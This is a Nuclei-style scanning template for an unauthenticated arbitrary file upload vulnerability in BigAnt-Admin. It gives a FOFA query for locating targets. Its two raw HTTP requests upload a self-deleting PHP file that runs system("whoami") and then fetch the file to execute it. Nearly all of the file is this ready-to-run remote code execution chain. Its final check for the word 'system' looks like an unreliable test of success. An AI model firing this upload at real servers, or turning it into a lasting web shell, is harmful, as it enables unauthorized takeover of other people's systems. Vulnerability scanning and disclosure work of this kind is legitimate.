id: BigAnt-Admin-file-upload-detection

info:
  name: 杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 文件上传
  author: HuanXiang
  severity: critical
  description: |-
    fofa: app="BigAnt-Admin"
    杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
  reference:
    - 
  tags: web,file-upload

variables:
  filename: "{{to_lower(rand_base(6))}}"  # 生成随机文件名，长度为6位，小写字母和数字

http:
  - raw:
      - |-
        POST /Addin/Upload/uploadMultipleFile.html HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html, */*; q=0.01
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfyjX
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        X-Requested-With: XMLHttpRequest
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Length: 199

        ------WebKitFormBoundary1zY65etyNeQDfyjX
        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
        
        <?php system("whoami");unlink(__FILE__);?>
        ------WebKitFormBoundary1zY65etyNeQDfyjX--

    matchers:
      - type: word
        part: body
        words:
          - "savename"
          - "savepath"
          - "savefile"
        condition: and

    extractors:
      - type: regex
        part: body
        regex:
          - '"savename":"([^"]+\.php)"'
        name: uploaded_file_name

    matchers-condition: and

  - raw:
      - |-
        GET /{{extracted.uploaded_file_name}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate

    matchers:
      - type: word
        part: body
        words:
          - "system"
        condition: and
